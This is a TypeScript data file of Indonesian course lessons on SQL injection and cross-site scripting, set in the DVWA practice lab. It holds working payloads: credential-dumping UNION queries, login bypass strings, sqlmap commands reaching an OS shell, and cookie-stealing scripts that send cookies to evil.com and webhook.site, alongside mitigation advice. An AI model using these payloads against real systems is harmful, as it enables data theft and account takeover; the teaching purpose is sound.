// CyberEd — Materi Serangan Batch 1: SQL Injection + XSS
// Semua string literal menggunakan double-quote dengan escape \". Tidak ada template literal yang kompleks.
import type { MateriData } from "../materi-content/runner";

export const seranganWeb: MateriData[] = [
  // ============================ SQL INJECTION ============================
  {
    judul: "💉 SQL Injection — Suntik SQL Jahat Lewat Input Form",
    emoji: "💉",
    deskripsi: "Pelajari cara suntik payload SQL berbahaya lewat form login dan URL parameter. Termasuk bypas login, dumping database, dan UNION-based attack.",
    level: "menengah",
    harga: 20000,
    hargaCoret: 30000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham konsep SQL Injection, mampu bypass login tanpa password, dumping isi database, dan tahu防御 parameterized query + WAF.",
    analogy: "Bayangkan kamu isi formulir di bank. Formulir minta isian \"Nomor Rekening Tujuan\". Kalian tulis \"123456789 atau 1=1\". Petugas bank tanpa curiga membaca literal: \"Transfer ke rekening 123456789, ATAU ke SEMUA rekening\". Sama persis dengan SQL Injection. Server membaca literal input user, tidak mencurigai itu kode SQL.",
    apaItu: "SQL Injection (SQLi) adalah vulnerability di mana attacker menyisipkan kode SQL ke dalam input user, sehingga dieksekusi oleh database bersama query legitimate. Dampaknya:\n\n1) Bypass authentication (login tanpa password admin)\n2) Data exfiltration (dump seluruh tabel dari database)\n3) Data manipulation (insert/update/delete data)\n4) Server takeover (di MySQL MSSQL dengan xp_cmdshell, di PostgreSQL dengan COPY ... PROGRAM)\n\nSQLi adalah #1 di OWASP Top 10 selama bertahun-tahun. Karena masih banyak aplikasi pakai string concatenation untuk build query.",
    caraKerja: "Aplikasi vulnerable biasanya punya kode backend seperti:\n\nPHP vulnerable:\n$username = $_POST[\"username\"];\n$password = $_POST[\"password\"];\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\ndb_query($query);\n\nKalau kamu input username = admin' -- , query menjadi:\nSELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'\n\n-- adalah komentar SQL — semua setelah username di-comment out. Server skip cek password.",
    asciiDiagram: "VULNERABLE QUERY:\n  $q = \"SELECT * FROM users WHERE username = '$u' AND password = '$p'\"\n\nATTACKER INPUT:\n  username: admin' --\n  password: anything\n\nRESULTING QUERY (sent to DB):\n  SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'\n                            ^\n                     EVERYTHING AFTER -- IS A COMMENT\n\nDATABASE READS:\n  SELECT * FROM users WHERE username = 'admin'\n\nRESULT:\n  Row returned. Login successful WITHOUT password check!",
    senjata: {
      pc: "**Burp Suite Community Edition** (intercept + replay request), **sqlmap** (otomatis scan SQLi di banyak database), **MySQL/MariaDB/PostgreSQL CLI**, **DVWA** atau **bWAPP** (lab PHP vulnerable).",
      hp: "Termux + install sqlmap via pkg install python lalu pip install sqlmap. Browser Firefox (support proxy mobile lebih baik dari Chrome).",
    },
    metode: [
      {
        nama: "Metode 1: Deteksi SQLi Manual di URL Parameter (Pemula)",
        level: "pemula",
        deskripsi: "Cara paling dasar: tambahkan karakter SQL khusus ke URL parameter dan lihat apakah aplikasi error atau behavior-nya berubah. Zero tooling, zero install.",
        prasyarat: [
          "Target yang punya parameter URL mengambil input dari user (coba DVWA atau lab yang ada SQL injection)",
          "Browser Chrome",
        ],
        langkah: [
          {
            judul: "Setup DVWA via Docker",
            aksi: "Kalian install Docker Desktop dulu. Setelah docker jalan, jalankan DVWA: docker run -d -p 80:80 vulnerables/web-dvwa. Tunggu 30 detik, lalu buka http://localhost. Login default admin/password. Klik DVWA Security di menu kiri, set level ke Low agar SQLi basic terlihat jelas.",
            command: "docker run -d -p 80:80 vulnerables/web-dvwa",
            expected: "DVWA jalan di http://localhost. Bisa login admin/password.",
          },
          {
            judul: "Buka SQL Injection lab",
            aksi: "Kalian klik menu SQL Injection di DVWA (http://localhost/vulnerabilities/sqli/). Ada field input User ID. Submit dengan angka: 1. Lihat response: biasanya keluar ID: 1 ... First name: admin ... Surname: admin. Ini hasil query.",
            expected: "Response: ID: 1 ... First name: admin ... Surname: admin (atau user pertama di DB).",
          },
          {
            judul: "Tambahkan single quote untuk deteksi",
            aksi: "Sekarang coba input: ' (tanda kutip tunggal). Submit. Cek response. Kalau muncul error SQL seperti You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ... → TARGET RENTAN SQLi.",
            command: "http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit",
            expected: "ERROR SQL muncul. Tanda rentan SQLi (error-based).",
          },
          {
            judul: "UNION-based attack untuk dump data",
            aksi: "UNION SELECT attack paling powerful. Cari jumlah kolom dengan iterasi:\n?id=1' ORDER BY 1-- -    → OK (1 kolom)\n?id=1' ORDER BY 2-- -    → OK\n?id=1' ORDER BY 3-- -    → ERROR (hanya 2 kolom)\nJadi ada 2 kolom. Sekarang inject UNION:\n?id=1' UNION SELECT user(), database()-- -\nAkan muncul 2 record: satu dengan nama user database, satu dengan nama database aktif.",
            command: "http://localhost/vulnerabilities/sqli/?id=1'+UNION+SELECT+user(),database()--+-",
            expected: "Output baris 1: hasil UNION. Misal: root@localhost dan dvwa.",
          },
          {
            judul: "Dump seluruh tabel credentials",
            aksi: "Sekarang dump user + password dari tabel users:\n?id=1' UNION SELECT user, password FROM users-- -\nOutput berupa: daftar username dan hash MD5 password. Copy hash admin (misal admin:5f4dcc3b5aa765d61d8327deb882cf99 = MD5 dari password) dan crack pakai https://crackstation.net atau hashcat offline.",
            command: "http://localhost/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-",
            expected: "Daftar user:password (hash). Crack pakai crackstation.net untuk lihat password asli.",
          },
        ],
        outputAkhir: "Berhasil dump seluruh tabel users termasuk admin password via UNION-based SQLi. Hash MD5 langsung di-crack.",
        kesalahanUmum: [
          {
            masalah: "❌ Error ORDER BY tidak keluar di kolom pertama",
            solusi: "Mungkin jumlah kolom bukan 2. Coba ORDER BY sampai dapat error + 1 untuk tahu jumlah kolom. Atau pakai cara lain: UNION SELECT NULL, NULL sampai cocok.",
          },
          {
            masalah: "❌ Output UNION cuma muncul satu baris",
            solusi: "Pakai id=-1 atau id=999999 agar original row tidak muncul, supaya row dari UNION yang dominan.",
          },
          {
            masalah: "❌ MD5 hash tidak bisa di-crack",
            solusi: "Coba online tools: crackstation.net, hashes.com. Untuk hash khusus, john atau hashcat dengan wordlist rockyou.txt.",
          },
        ],
      },
      {
        nama: "Metode 2: Bypass Login dengan SQL Comment (Menengah)",
        level: "menengah",
        deskripsi: "Kalau aplikasi melakukan query langsung di form login, kamu bisa bypass tanpa tahu password. Serangan paling sederhana tapi powerful.",
        prasyarat: [
          "DVWA atau lab login form",
          "Burp untuk intercept submit login",
        ],
        langkah: [
          {
            judul: "Buka form login target",
            aksi: "Kalian buka DVWA, ke halaman login di PoC login admin (misal http://target/login.php). Masukkan random username dan password, klik login. Burp akan intercept request login (POST).",
            expected: "Request POST login muncul di Burp intercept window.",
          },
          {
            judul: "Tambahkan SQL injection di username field",
            aksi: "Di Burp, ganti field username menjadi: admin' -- . Jangan isi password apa-apa (atau isi asal). Klik Forward. Burp forward request ke server.\n\nServer menerima query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'xxxxxxx'. Karena -- adalah komentar SQL, password dicek di-skip.",
            command: "admin' -- ",
            expected: "Response: redirect ke dashboard. Login BERHASIL sebagai admin tanpa know password!",
          },
          {
            judul: "Variasi: # sebagai comment (MySQL)",
            aksi: "Untuk MySQL, karakter # juga jadi comment. Coba: admin' # sebagai input username. # lebih umum di MySQL daripada -- (double dash plus space).",
            command: "admin' #",
            expected: "Login sukses.",
          },
          {
            judul: "Variasi: OR 1=1 untuk full bypass",
            aksi: "Atau pakai SQL universal: admin' OR '1'='1. Query jadi: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'xxx'. Kondisi OR benar → return semua user. Login sebagai user pertama (biasanya admin).",
            command: "admin' OR '1'='1",
            expected: "Login sukses sebagai admin.",
          },
          {
            judul: "Mengapa parameterized query cegah ini",
            aksi: "WITH parameterized query, username field treated as DATA STRING, bukan SQL code. Apapun yang user input akan aman. Coba cek kode vulnerable: $q = \"SELECT * FROM users WHERE username = ?\"; db.query($q, [username]). Even if username = admin' -- , server hanya mencari literal admin' -- sebagai string — tidak ditafsir sebagai SQL.",
          },
        ],
        outputAkhir: "Berhasil bypass login di aplikasi vulnerable. Paham variasi comment SQL untuk berbagai database.",
        kesalahanUmum: [
          {
            masalah: "❌ Comment character salah (-- tanpa spasi setelah)",
            solusi: "Pastikan double dash diikuti spasi: -- (atau # untuk MySQL). Beberapa interpreter butuh spasi.",
          },
          {
            masalah: "❌ Login gagal terus",
            solusi: "Cek apakah input masuk dengan benar. Pakai Burp Inspector. Atau ganti pendekatan: pakai admin' -- x (tambah karakter random setelah --).",
          },
        ],
      },
      {
        nama: "Metode 3: SQLMap Otomatis Scan (Lanjut)",
        level: "lanjut",
        deskripsi: "Untuk lab CTF atau audit resmi, pakai SQLMap. Tool otomatis ini akan scan injeksi, deteksi database, dan dump full table. Hands-off setelah dijalankan.",
        prasyarat: [
          "SQLMap installed (pip install sqlmap atau apt install sqlmap)",
          "Lab DVWA / target berizin",
          "Cookie session target: untuk DVWA, login dulu, capture PHPSESSID dari DevTools",
        ],
        langkah: [
          {
            judul: "Capture cookie session target",
            aksi: "Kalian login DVWA. Buka DevTools (F12) → tab Application → Cookies → copy nilai PHPSESSID. Misal cookie yang dipakai = PHPSESSID=abc123def456.\n\nCmd untuk lihat cookie dari CLI: curl -I -X GET http://localhost/login.php -c cookies.txt.",
            command: "curl -c cookies.txt -X POST http://localhost/login.php -d \"username=admin&password=password&Login=Login\"",
            expected: "cookies.txt berisi PHPSESSID=...",
          },
          {
            judul: "Jalankan SQLMap dengan cookie dan target URL",
            aksi: "Target URL DVWA SQLi lab: http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit\nJalankan:\nsqlmap -u \"http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=your_cookie_value\" --dbs\n\nSQLMap otomatis detect DBMS, payload yang effective, dan dump semua database. --dbs akan list database.",
            command: "sqlmap -u \"http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=abc123\" --dbs",
            expected: "SQLMap menampilkan available databases: dvwa, information_schema, mysql.",
          },
          {
            judul: "Dump tabel users dengan --dump",
            aksi: "Lanjut setelah database list ketemu. Dump tabel di dvwa:\nsqlmap -u \"URL\" --cookie=\"...\" -D dvwa --tables\n→ list semua tables di dvwa: users, guestbook, dvwa.\nSekarang:\nsqlmap -u \"URL\" --cookie=\"...\" -D dvwa -T users --dump\n→ dump seluruh isi tabel users (semua record + kolom). Output akan otomatis crack MD5 password.",
            command: "sqlmap -u \"http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit\" --cookie=\"PHPSESSID=abc123\" -D dvwa -T users --dump",
            expected: "Daftar user + password plaintext (otomatis di-crack). admin/password, gordonb/abc123, dll.",
          },
          {
            judul: "Tingkat lanjut: sampai RCE di MySQL",
            aksi: "Kalau target MySQL mendukung file read (dan kamu punya hak FILE), SQLMap bisa:\nsqlmap ... --file-read=/etc/passwd    → baca file system\nsqlmap ... --os-shell                  → dapat shell interaktif (kalau berhasil)\n\n⚠️ Hanya untuk lab resmi dengan izin tertulis! Tanpa izin = illegal access.",
            command: "sqlmap -u \"URL\" --cookie=\"...\" --os-shell",
            expected: "os-shell prompt muncul. Kamu punya shell command di server.",
            catatan: "⚠️ Sama seperti materi lain: hanya untuk lab berizin. Penyalahgunaan = UU ITE.",
          },
        ],
        outputAkhir: "Berhasil pakai SQLMap otomatis dump semua tabel + crack password + bahkan potentially OS shell. Workflow pentest SQLi standar industri.",
        kesalahanUmum: [
          {
            masalah: "❌ SQLMap tidak detect injeksi",
            solusi: "Tambah --level=5 --risk=3 untuk coverage lebih agresif. Coba --technique=BEUSTQ (semua teknik: boolean, error, union, stacked, time, query).",
          },
          {
            masalah: "❌ Cookie expire / SQLMap kembali ke login",
            solusi: "Re-login dan capture cookie baru sebelum SQLMap run. Pakai --randomize untuk parameter tertentu.",
          },
        ],
      },
    ],
    mitigasi: "Pertahanan utama dari SQLi — berlapis:\n\n1. Parameterized Query (WAJIB): gunakan prepared statement / placeholder untuk semua input user.\n\nJS examples:\n  db.query(\"SELECT * FROM users WHERE id = ?\", [userId])\n  cursor.execute(\"SELECT * FROM users WHERE id = ?\", (userId,))\n  $stmt = $pdo->prepare(\"SELECT * FROM users WHERE id = ?\"); $stmt->execute([$id]);\n\nLibrary/orm akan escape string user jadi literal data, bukan SQL code.\n\n2. Stored Procedure: database stored procedure (signature tetap) membantu limit attack surface.\n\n3. Input validation: whitelist expected values untuk field yang punya enum (misal status). Length check dan regex untuk field bebas.\n\n4. Least privilege DB user: app DB user HANYA punya SELECT/INSERT di tabel app — bukan DROP, GRANT, FILE priv.\n\n5. WAF dengan SQLi rules: ModSecurity + OWASP CRS block payload SQLi umum.\n\n6. Error handling: jangan tampilkan error SQL ke user. Log ke server, tampilkan pesan generic ke user.\n\n7. Hide framework info: jangan expose versi database di error messages.",
    latihan: [
      "🔰 Di DVWA, dump isi seluruh tabel users pakai UNION manual. Crack MD5 admin dengan crackstation.net.",
      "🔰 Pasang Burp CA cert di mobile Firefox. Akses DVWA dari HP via Termux reverse proxy.",
      "🟡 Pelajari SQLMap --level=5 --risk=3. Tes di DVWA, observasi payload apa saja yang SQLMap coba.",
      "🟡 Pelajari about blind SQLi: ?id=1 AND SLEEP(5) akan delay 5 detik kalau rentan.",
      "🔴 Setup lab dengan database berbeda (PostgreSQL). Pelajari syntax khusus PostgreSQL (cast, DISTINCT ON, dsb).",
    ],
    faq: [
      { q: "Apa beda SQLi dan NoSQL Injection?", a: "SQLi = SQL injection (target database SQL: MySQL, PostgreSQL, dll). NoSQL Injection = target NoSQL (MongoDB, Cassandra) — beda payload bentuknya. Untuk MongoDB, pakai {\"$gt\":\"\"} untuk bypass." },
      { q: "Apakah NoSQL database rentan?", a: "Ya kalau application code pakai string concatenation untuk query. MongoDB query ditulis sebagai object JavaScript: db.users.find({username: req.body.username}). Kalau input langsung di-spread, attacker bisa kirim {\"$ne\":null} untuk bypass." },
      { q: "Apakah SQLi masih umum di 2024?", a: "Common terutama di legacy app, custom-built CMS, dan internal admin tools. Modern framework (Rails, Django, Laravel, Next.js) auto handle. Tapi banyak startup masih punya SQLi karena training kurang." },
      { q: "Bagaimana cara cek SQLi otomatis di banyak endpoint?", a: "Tools: SQLMap (single URL), Burp Suite Active Scanner (multi endpoint), OWASP ZAP Active Scan. Untuk DevSecOps: tambah Semgrep rule untuk detect string concatenation pattern di code review." },
    ],
    ringkasan: [
      "SQLi = injeksi kode SQL via input user untuk dump / bypass",
      "#1 vulnerability OWASP Top 10 sepanjang tahun",
      "Tanda rentan: error SQL muncul dari input user",
      "3 teknik utama: error-based (lihat error), UNION-based (dump data), blind (delay-based atau boolean-based)",
      "Tool wajib: SQLMap untuk otomatis scan + dump",
      "Parameterized query = solusi utama + WAF sebagai defense in depth",
      "Latihan aman: DVWA via Docker (berbayar/gratis CTF)",
    ],
    materiRelated: ["XSS", "WAF (ModSecurity)", "Secure Coding", "CSRF"],
  } as MateriData,

  // ============================ XSS ============================
  {
    judul: "🎨 Cross-Site Scripting (XSS) — Suntik JavaScript Jahat di Halaman Orang",
    emoji: "🎨",
    deskripsi: "Pelajari 3 jenis XSS (reflected, stored, DOM-based), bagaimana cookie stealing + phishing dipakai, dan防御 sederhana dengan output encoding.",
    level: "menengah",
    harga: 20000,
    hargaCoret: 30000,
    isGratis: false,
    tipe: "serangan",
    tujuan: "Kamu paham ketiga jenis XSS (Reflected, Stored, DOM-based), mampu bikin payload cookie-stealer + simulasi self-XSS ke lab, dan tahu防御 output encoding + CSP.",
    analogy: "Bayangkan tembok graffiti kota. Reflected XSS = catatan reply di forum yang kalau di-klik akan redirect. Stored XSS = vandalism permanen yang merangkai ke dalam street artwork (semua orang yang lewat kena). DOM-XSS = jebakan lain di gang tikus yang cuma trigger saat ada perubahan URL params.",
    apaItu: "Cross-Site Scripting (XSS) adalah vulnerability di mana attacker menyisipkan kode JavaScript ke halaman web asli, sehingga script itu dieksekusi di browser user lain. Dampaknya:\n\n1) Cookie stealing: ambil cookie session user lain (kalau tidak HttpOnly), otomatis login impersonation\n2) Phishing in-context: tampilkan form palsu di brand asli (bank tinggal login tapi UI-nya adalah user input attacker)\n3) Keystroke logging: track semua ketikan keyboard user\n4) Crypto mining: pakai CPU user untuk mine crypto (cryptojacking)\n5) Drive-by-download: redirect ke malware\n\n3 jenis:\n- Reflected: payload di URL/request — cuma trigger kalau user klik link payload\n- Stored: payload disimpan di database — semua yang view kena\n- DOM-based: payload ada di client-side JS — tidak pernah sampai server",
    caraKerja: "Aplikasi vulnerable: search query di-reflect langsung ke page tanpa escape.\n\nHTML vulnerable:\n  <p>Hasil pencarian untuk: ${query}</p>  <!-- vulnerable -->\n  <p>Hasil pencarian untuk: ${escapeHtml(query)}</p>  <!-- aman -->\n\nKalau query = <script>fetch('https://evil.com/c?'+document.cookie)</script>, browser akan execute script. Untuk stored XSS, attacker injector payload via comment form / profile name, dan payload tersebar ke semua viewers tanpa perlu action.",
    asciiDiagram: "REFLECTED XSS:\n  User klik: https://target.com/search?q=<script>alert(1)</script>\n  Server returns: <p>Hasil pencarian untuk: <script>alert(1)</script></p>\n  Browser executes script → alert muncul\n\nSTORED XSS:\n  Attacker submit comment: Hello <script>document.location='https://evil.com/c?'+document.cookie</script>\n  Database save: comment asli (no escape)\n  User lain Buka halaman comment → <script> ter-execute → cookie terkirim ke evil.com\n  Attacker lihat log → punya cookie user → impersonate\n\nDOM XSS:\n  Fragment URL: target.com/#<img src=x onerror=alert(1)>\n  client.js baca window.location.hash → render innerHTML → execute attribute onerror",
    senjata: {
      pc: "**Burp Suite** (poC + intercept), browser **Chrome/Firefox** (untuk coba payload sendiri), text editor (untuk bikin HTML PoC). Lab: DVWA Reflected XSS + Stored XSS, atau OWASP WebGoat.",
      hp: "Termux + browser. Untuk lab DVWA dari HP, akses via Termux reverse proxy atau langsung dari browser HP ke server lokal yang sama network.",
    },
    metode: [
      {
        nama: "Metode 1: Reflected XSS — URL Parameter (Pemula)",
        level: "pemula",
        deskripsi: "Cara paling sederhana: injeksi payload via URL, lihat apakah di-render di page. Cocok untuk belajar konsep XSS.",
        prasyarat: [
          "DVWA terinstall via Docker (atau HTTP lab vulnerable lainnya)",
          "Browser Chrome",
        ],
        langkah: [
          {
            judul: "Setup DVWA + Reflected XSS page",
            aksi: "Kalian pastikan DVWA jalan (docker). Login admin/password. Set security ke Low. Buka tab XSS (Reflected) di menu kiri (atau PoC XSS reflected). Ada field Name:. Coba submit nama biasa: Alice. Munculkan: Hello Alice.",
            expected: "Response: Hello Alice",
          },
          {
            judul: "Submit payload XSS pertama",
            aksi: "Submit nama dengan payload XSS: <script>alert('XSS found')</script>. Klik submit. Response page berisi literal script tag → browser executes JavaScript → popup alert muncul!",
            command: "<script>alert('XSS found')</script>",
            expected: "Popup alert muncul: XSS found. Tanda target rentan reflected XSS.",
          },
          {
            judul: "Cookie stealer (simulasi self-target)",
            aksi: "Sekarang coba payload untuk ambil cookie sendiri sebagai proof-of-concept:\nGanti alert dengan: <script>document.write('<img src=\"https://webhook.site/abc-xyz?c=' + document.cookie + '\">')</script>\n\nKamu perlu siapkan webhook.site untuk capture. Buka https://webhook.site dulu, copy URL unik. Ganti webhook URL di payload dengan punya kamu.\n\nSubmit, lalu cek webhook.site → di sana akan muncul GET request dengan parameter c berisi cookie kamu sendiri.",
            command: "<script>document.write('<img src=\"https://webhook.site/YOUR-ID?c='+document.cookie+'\">')</script>",
            expected: "Request masuk di webhook.site dengan c=PHPSESSID=xxx di query string. Cookie ter-exposed.",
            catatan: "Untuk DVWA cookie default HttpOnly tidak di-set, jadi browser allow JS baca cookie. Untuk produksi modern, HttpOnly=True → cookie tidak bisa di-read → cookie stealing blocked.",
          },
          {
            judul: "Bypass dengan event handler (kalau <script> di-filter)",
            aksi: "DVWA Medium filter tag <script>. Pakai event handler di tag HTML lain:\n<img src=x onerror=alert('XSS')>\nAtau:\n<svg onload=alert('XSS')>\nAtau:\n<body onload=alert('XSS')>\nDVWA High filter regex tag <script>, tapi bisa pakai: <script>alert(1)</scrIPt><script>alert(2)</SCRipt>  (case variation masih bisa bypass filter lemah).",
            command: "<img src=x onerror=\"alert('XSS')\">",
            expected: "Alert popup muncul. Bypass filter tag <script>.",
          },
        ],
        outputAkhir: "Bertahap dari alert XSS found sederhana → cookie stealer (simulasi self-target lewat webhook.site). Tanda XSS jelas.",
        kesalahanUmum: [
          {
            masalah: "❌ Alert tidak muncul di DVWA Medium ke atas",
            solusi: "Cek Security level. Medium filter tag <script>. Pakai img/svg/body dengan onerror/onload.",
          },
          {
            masalah: "❌ Cookie tidak terkirim ke webhook.site (network request tidak muncul)",
            solusi: "<img> tag butuh src valid untuk fire network. Coba pakai fetch() yang reliable: <script>fetch(\"https://webhook.site/abc?c=\"+document.cookie)</script>. Tapi ini hanya jalan kalau cookie tidak HttpOnly.",
          },
        ],
      },
      {
        nama: "Metode 2: Stored XSS — Inject Permanen yang Kena Semua Orang (Menengah)",
        level: "menengah",
        deskripsi: "Stored XSS jauh lebih berbahaya: payload disimpan di database, dieksekusi setiap kali user view. Mirip worm yang menyebar otomatis.",
        prasyarat: [
          "DVWA atau lab yang ada form comment / message",
          "Cookie session admin untuk verifikasi dampak",
        ],
        langkah: [
          {
            judul: "Setup webhook.site untuk capture",
            aksi: "Kalian buka https://webhook.site di browser. Copy URL unik kamu (misal: https://webhook.site/klm789). Ini akan menerima GET request dari victim.",
            expected: "URL webhook.site sudah disalin.",
          },
          {
            judul: "Submit comment dengan payload XSS di DVWA",
            aksi: "Pergi ke DVWA → XSS (Stored) di menu kiri. Ada form Guestbook: nama, message. Submit dengan field message berisi payload:\n<script>fetch(\"https://webhook.site/klm789?u=admin&c=\"+document.cookie)</script>\n\nKlik Submit guestbook.",
            command: "<script>fetch(\"https://webhook.site/YOUR-ID?c=\"+document.cookie)</script>",
            expected: "Comment tersimpan di database. Muncul di list guestbook.",
          },
          {
            judul: "Trigger XSS tiap kali page dibuka",
            aksi: "Sekarang setiap kali DVWA XSS (Stored) dibuka — script auto-execute. Kalau admin buka halaman yang sama dengan session admin cookie, request akan ke webhook.site dari session admin.\n\nBuat simulasi: login di browser lain (atau HTTPie dari CLI) → buka DVWA XSS Stored. Cookie admin akan fir ke webhook.site.",
            command: "Akses DVWA XSS Stored page di tab baru atau browser berbeda",
            expected: "Cookie admin terkirim ke webhook.site (kalau HttpOnly=False).",
          },
          {
            judul: "Retrieval cookie attacker",
            aksi: "Attacker lihat webhook.site — nampak GET request dengan parameter c=PHPSESSID=admincookie. Pakai cookie ini, attacker bisa impersonate admin via curl atau session-cookie injection di browser sendiri.",
          },
        ],
        outputAkhir: "Berhasil execute stored XSS dan retrieve cookie admin via webhook.site. Pemahaman bahwa stored XSS more impactful karena tidak butuh interaksi setiap user.",
        kesalahanUmum: [
          {
            masalah: "❌ Form tidak submit atau error validation",
            solusi: "Cek length limit DVWA. Beberapa form ada max length. Pakai muat lebih pendek.",
          },
          {
            masalah: "❌ Cookie tidak flammable (HttpOnly atau SameSite)",
            solusi: "Untuk lab DVWA, HttpOnly default OFF di security Low. Kalau HttpOnly ON, cookie tidak bisa di-read dari JavaScript. Stored XSS masih jalan tapi info lain (keystroke, location, dll) masih bisa di-exfiltrate.",
          },
        ],
      },
      {
        nama: "Metode 3: DOM-Based XSS — Client Side Only (Lanjut)",
        level: "lanjut",
        deskripsi: "DOM XSS murni client-side: payload ada di URL hash / parameter, di-render oleh JS di page (innerHTML atau eval). Server tidak pernah lihat payload.",
        prasyarat: [
          "Page yang memproses URL fragment secara dinamis via JavaScript",
        ],
        langkah: [
          {
            judul: "Cari URL dengan hash di-fragment",
            aksi: "Kalian buka target page (DVWA DOM XSS page atau aplikasi yang punya hash listener). URL terlihat: target.com/page.html#default\nCek sumber page via DevTools → Sources → main.js. Cari baris yang baca location.hash atau location.search dan masukkan ke innerHTML atau document.write.",
            expected: "Identifikasi script: var lang = location.hash.substring(1); document.write(\"Lang: \" + lang);",
          },
          {
            judul: "Inject via hash URL",
            aksi: "Craft URL hash dengan payload:\ntarget.com/page.html#<img src=x onerror=alert(1)>\nAtau dengan script payload:\ntarget.com/page.html#<script>alert('DOM XSS')</script>\nHasil: kalau code vulnerable pakai document.write atau innerHTML tanpa escape, payload execute.",
            command: "target.com/page.html#<script>alert('DOM XSS')</script>",
            expected: "Alert muncul. XSS triggered purely from URL fragment.",
          },
          {
            judul: "Craft DOM XSS via window.name / postMessage",
            aksi: "Varian yang lebih sulit: window.name bertahan antar page. Setup attacker page yang set window.name = <img src=x onerror=alert(1)>, lalu redirect ke target. Target baca window.name → XSS executed.\n\nAtau postMessage handler: target punya window.addEventListener(\"message\", e => { eval(data); }) → attacker send message berisi payload.",
          },
        ],
        outputAkhir: "Berhasil trigger DOM-based XSS via URL fragment. Paham bahwa DOM XSS tidak meninggalkan log di server.",
        kesalahanUmum: [
          {
            masalah: "❌ Page vulnerable tapi tidak ditemukan",
            solusi: "DOM XSS tidak terlihat di response HTML. Periksa JavaScript files secara manual. Tools: Burp Suite dengan extension DOM Invader otomatis detect DOM source vs sink.",
          },
        ],
      },
    ],
    mitigasi: "Pertahanan XSS — beberapa lapis:\n\n1. Output Encoding (WAJIB): setiap user-controlled string yang dirender ke HTML harus di-escape karakter <, >, &, doublequote, singlequote. Framework modern biasanya auto.\n\n2. Content-Security-Policy (CSP): header HTTP untuk browser enforce script whitelist.\nContoh CSP string:\n  Content-Security-Policy: default-src 'self'; script-src 'self' https://trust.com; object-src 'none'\nBrowser tolak inline script dan script dari domain lain.\n\n3. HttpOnly Cookie: cookie HttpOnly tidak bisa di-read dari JavaScript → cookie stealing via XSS blocked.\n\n4. Input Validation: untuk field HTML-rich (komentar blog), sanitize pakai library (DOMPurify untuk JS, HTMLPurifier untuk PHP).\n\n5. Avoid dangerous sinks: jangan pakai innerHTML, document.write, eval() — textContent lebih aman. Hindari inline JS handler (onerror, onclick prefer programmatic addEventListener dengan data).\n\n6. Modern framework: React/Vue/Angular auto-escape JSX/template. Tapi ingat: dangerouslySetInnerHTML / v-html masih vulnerable.\n\n7. WAF dengan XSS rules: ModSecurity OWASP CRS block XSS payload umum.",
    latihan: [
      "🔰 Di DVWA Reflected XSS, submit suatu payload img/svg dengan onerror untuk bypass filter.",
      "🔰 Setup webhook.site gratis. Capture cookie self kamu sendiri sebagai lab.",
      "🟡 Pelajari cara sanitize HTML rich text pakai DOMPurify (JS) atau HTMLPurifier (PHP). Lab: sanitize input user, lalu re-render lalu test XSS.",
      "🟡 Setup Nginx reverse proxy dengan Content-Security-Policy header. Test XSS lab — sekarang script inline diblock.",
      "🔴 Pelajari Burp Suite extension DOM Invader untuk otomatis cari DOM-based XSS.",
    ],
    faq: [
      { q: "Apa perbedaan Reflected, Stored, dan DOM XSS?", a: "Reflected datang dari URL/request server. Stored kekal di database. DOM murni client side (URL fragment)." },
      { q: "Apakah HTTPS=XSS blocker?", a: "Tidak. HTTPS cuma encrypt. XSS tetap berjalan karena JavaScript ada di trusted page. HTTPS tidak mencegah XSS." },
      { q: "CSP wajib pakai unsafe-inline?", a: "Kalau unsafe-inline aktif = inline script diperbolehkan. Defeat from CSP purpose. Pakai nonces/hash untuk mitigasi. unsafe-inline ada untuk legacy app yang banyak inline. Medium solution: unsafe-inline https: untuk HTTPS domain saja." },
      { q: "Framework React/Vue aman dari XSS?", a: "Untuk text content default (auto-escape). Tapi sekali pakai dangerouslySetInnerHTML, v-html, atau eval — kembali vulnerable. Tetap saja tambah CSP + HttpOnly." },
    ],
    ringkasan: [
      "XSS = suntik script JS ke page domain lain. Eksekusi otomatis di browser victim",
      "3 jenis: Reflected (satu URL), Stored (DB), DOM (URL fragment/client-side)",
      "Dampak: cookie stealing, phishing, keystroke logging, crypto hijack, dll",
      "Tanda rentan: <script>alert(1)</script> dieksekusi tanpa filter",
      "Tool: Burp Suite, DVWA, webhooks untuk capture, Burp DOM Invader",
      "Defense layers: Output Encoding + CSP + HttpOnly + Input Validation + WAF",
      "Modern app: framework auto-escape tapi developer harus tahu kapan escape di-bypass",
    ],
    materiRelated: ["SQL Injection", "Session Hijacking", "CSRF", "WAF (ModSecurity)"],
  } as MateriData,
];

export default seranganWeb;
